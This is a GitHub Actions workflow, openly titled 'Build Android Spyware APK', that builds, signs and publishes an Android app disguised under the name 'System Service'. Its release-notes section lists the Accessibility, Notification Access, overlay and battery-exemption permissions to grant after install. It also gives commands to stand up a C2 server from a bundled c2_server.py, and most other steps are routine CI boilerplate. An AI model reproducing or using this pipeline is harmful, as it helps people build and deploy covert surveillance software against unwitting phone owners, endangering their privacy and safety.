name: Build Android Spyware APK

on:
  push:
    branches: [main, master]
    tags: ['v*']
  pull_request:
    branches: [main, master]
  workflow_dispatch:
    inputs:
      build_type:
        description: 'Build type'
        required: true
        default: 'release'
        type: choice
        options:
          - release
          - debug
      version_name:
        description: 'Version name (e.g., 1.0.0)'
        required: false
        default: ''
      version_code:
        description: 'Version code (integer)'
        required: false
        default: ''

env:
  JAVA_VERSION: '17'
  GRADLE_VERSION: '8.5'
  ANDROID_SDK_VERSION: '34'
  BUILD_TOOLS_VERSION: '34.0.0'

jobs:
  build:
    name: Build ${{ github.event.inputs.build_type || 'release' }} APK
    runs-on: ubuntu-latest
    timeout-minutes: 30
    permissions:
      contents: write
      packages: write
      attestations: write
      id-token: write

    steps:
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Checkout
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Setup Java
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Setup JDK ${{ env.JAVA_VERSION }}
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: ${{ env.JAVA_VERSION }}
          cache: 'gradle'

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Setup Android SDK
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Setup Android SDK
        uses: android-actions/setup-android@v3
        with:
          api-level: ${{ env.ANDROID_SDK_VERSION }}
          build-tools-version: ${{ env.BUILD_TOOLS_VERSION }}
          ndk-version: r26d
          cmake-version: 3.22.1

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Cache Gradle
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Cache Gradle packages
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
          restore-keys: |
            ${{ runner.os }}-gradle-

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Grant execute permission to gradlew
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Grant execute permission to gradlew
        run: chmod +x ./gradlew

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Configure version from inputs or git tags
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Determine version
        id: version
        run: |
          BUILD_TYPE="${{ github.event.inputs.build_type || 'release' }}"
          VERSION_NAME="${{ github.event.inputs.version_name }}"
          VERSION_CODE="${{ github.event.inputs.version_code }}"
          
          # If version_name not provided, try to get from git tag
          if [ -z "$VERSION_NAME" ]; then
            if [[ "${{ github.ref }}" == refs/tags/v* ]]; then
              VERSION_NAME="${{ github.ref_name }}"
              VERSION_NAME="${VERSION_NAME#v}"
            else
              VERSION_NAME="$(date +%Y.%m.%d)-$(git rev-parse --short HEAD)"
            fi
          fi
          
          # If version_code not provided, generate from date + commit count
          if [ -z "$VERSION_CODE" ]; then
            COMMIT_COUNT=$(git rev-list --count HEAD)
            DATE_CODE=$(date +%y%m%d)
            VERSION_CODE="${DATE_CODE}${COMMIT_COUNT}"
            # Ensure it fits in int (max 2147483647)
            if [ $VERSION_CODE -gt 2147483647 ]; then
              VERSION_CODE=$((VERSION_CODE % 2147483647))
            fi
          fi
          
          echo "version_name=$VERSION_NAME" >> $GITHUB_OUTPUT
          echo "version_code=$VERSION_CODE" >> $GITHUB_OUTPUT
          echo "build_type=$BUILD_TYPE" >> $GITHUB_OUTPUT
          
          echo "Version Name: $VERSION_NAME"
          echo "Version Code: $VERSION_CODE"
          echo "Build Type: $BUILD_TYPE"

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Update version in build.gradle
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Update version in build.gradle
        run: |
          sed -i "s/versionCode [0-9]*/versionCode ${{ steps.version.outputs.version_code }}/" app/build.gradle
          sed -i "s/versionName \".*\"/versionName \"${{ steps.version.outputs.version_name }}\"/" app/build.gradle
          cat app/build.gradle | grep -E "versionCode|versionName"

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Build APK
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Build ${{ steps.version.outputs.build_type }} APK
        run: |
          ./gradlew clean assemble${{ steps.version.outputs.build_type | upper }} --no-daemon --stacktrace
        env:
          GRADLE_OPTS: "-Dorg.gradle.jvmargs=-Xmx4g -Dorg.gradle.parallel=true"

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Verify APK
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Verify APK
        run: |
          APK_PATH="app/build/outputs/apk/${{ steps.version.outputs.build_type }}/app-${{ steps.version.outputs.build_type }}.apk"
          if [ ! -f "$APK_PATH" ]; then
            echo "APK not found at $APK_PATH"
            find app/build/outputs -name "*.apk" 2>/dev/null
            exit 1
          fi
          echo "APK found: $APK_PATH"
          echo "Size: $(du -h $APK_PATH | cut -f1)"
          
          # Verify with aapt2
          aapt2 dump badging "$APK_PATH" | head -20

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Sign APK (if keystore provided)
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Sign APK
        if: env.KEYSTORE_BASE64 != ''
        id: sign
        uses: r0adkll/sign-android-release@v1
        with:
          releaseDirectory: app/build/outputs/apk/${{ steps.version.outputs.build_type }}
          signingKeyBase64: ${{ secrets.KEYSTORE_BASE64 }}
          alias: ${{ secrets.KEY_ALIAS }}
          keyStorePassword: ${{ secrets.KEYSTORE_PASSWORD }}
          keyPassword: ${{ secrets.KEY_PASSWORD }}
        env:
          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Upload APK as artifact
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: system-service-${{ steps.version.outputs.build_type }}-${{ steps.version.outputs.version_name }}
          path: app/build/outputs/apk/${{ steps.version.outputs.build_type }}/*.apk
          retention-days: 30
          compression-level: 6

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Create Release (on tag push)
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Create Release
        if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
        uses: softprops/action-gh-release@v2
        with:
          name: System Service v${{ steps.version.outputs.version_name }}
          tag_name: ${{ github.ref_name }}
          body: |
            ## System Service v${{ steps.version.outputs.version_name }}
            
            **Build Type:** ${{ steps.version.outputs.build_type }}
            **Version Code:** ${{ steps.version.outputs.version_code }}
            **Commit:** ${{ github.sha }}
            **Build Date:** $(date -u +"%Y-%m-%d %H:%M:%S UTC")
            
            ### Changes
            ${{ github.event.head_commit.message }}
            
            ### Installation
            ```bash
            adb install -r system-service-${{ steps.version.outputs.build_type }}.apk
            ```
            
            ### Required Permissions (grant manually after install)
            - Accessibility Service: Settings → Accessibility → System Service → ON
            - Notification Access: Settings → Apps → Special Access → Notification Access → System Service → Allow
            - Battery Optimization: Settings → Battery → Battery Optimization → System Service → Don't optimize
            - Overlay Permission: Settings → Apps → Special Access → Display over other apps → System Service → Allow
            
            ### C2 Server
            ```bash
            pip install websockets cryptography
            openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365
            python3 c2_server.py --cert cert.pem --key key.pem --port 8443
            ```
          draft: false
          prerelease: false
          files: |
            app/build/outputs/apk/${{ steps.version.outputs.build_type }}/*.apk
            c2_server.py
            README.md
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Upload to GitHub Packages (optional)
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Upload to GitHub Packages
        if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
        run: |
          # Create a generic package with the APK
          echo "APK uploaded as release asset"

      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      # Build Summary
      # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      - name: Build Summary
        run: |
          APK_PATH="app/build/outputs/apk/${{ steps.version.outputs.build_type }}/app-${{ steps.version.outputs.build_type }}.apk"
          if [ -f "$APK_PATH" ]; then
            echo "## Build Complete ✅" >> $GITHUB_STEP_SUMMARY
            echo "" >> $GITHUB_STEP_SUMMARY
            echo "| Property | Value |" >> $GITHUB_STEP_SUMMARY
            echo "|----------|-------|" >> $GITHUB_STEP_SUMMARY
            echo "| **Version** | ${{ steps.version.outputs.version_name }} |" >> $GITHUB_STEP_SUMMARY
            echo "| **Version Code** | ${{ steps.version.outputs.version_code }} |" >> $GITHUB_STEP_SUMMARY
            echo "| **Build Type** | ${{ steps.version.outputs.build_type }} |" >> $GITHUB_STEP_SUMMARY
            echo "| **APK Size** | $(du -h $APK_PATH | cut -f1) |" >> $GITHUB_STEP_SUMMARY
            echo "| **Commit** | ${{ github.sha }} |" >> $GITHUB_STEP_SUMMARY
            echo "| **Branch** | ${{ github.ref_name }} |" >> $GITHUB_STEP_SUMMARY
            echo "| **Build Date** | $(date -u +"%Y-%m-%d %H:%M:%S UTC") |" >> $GITHUB_STEP_SUMMARY
            echo "" >> $GITHUB_STEP_SUMMARY
            echo "### Download" >> $GITHUB_STEP_SUMMARY
            echo "Artifact: \`system-service-${{ steps.version.outputs.build_type }}-${{ steps.version.outputs.version_name }}\`" >> $GITHUB_STEP_SUMMARY
          fi

  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Lint & Test Job (optional)
  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  lint:
    name: Lint & Static Analysis
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup JDK ${{ env.JAVA_VERSION }}
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: ${{ env.JAVA_VERSION }}
          cache: 'gradle'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3
        with:
          api-level: ${{ env.ANDROID_SDK_VERSION }}

      - name: Grant execute permission
        run: chmod +x ./gradlew

      - name: Run Lint
        run: ./gradlew lint --no-daemon
        continue-on-error: true

      - name: Run Detekt (if configured)
        run: ./gradlew detekt --no-daemon
        continue-on-error: true

      - name: Upload Lint Report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: lint-report
          path: app/build/reports/lint-results*.html
          retention-days: 7

  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Dependency Check
  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  dependency-check:
    name: Dependency Vulnerability Scan
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Run OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'System Service'
          path: '.'
          format: 'HTML'
          out: 'dependency-check-report'
          args: >
            --failOnCVSS 7
            --suppression ./dependency-check-suppression.xml
        continue-on-error: true

      - name: Upload Dependency Check Report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: dependency-check-report
          path: dependency-check-report/
          retention-days: 7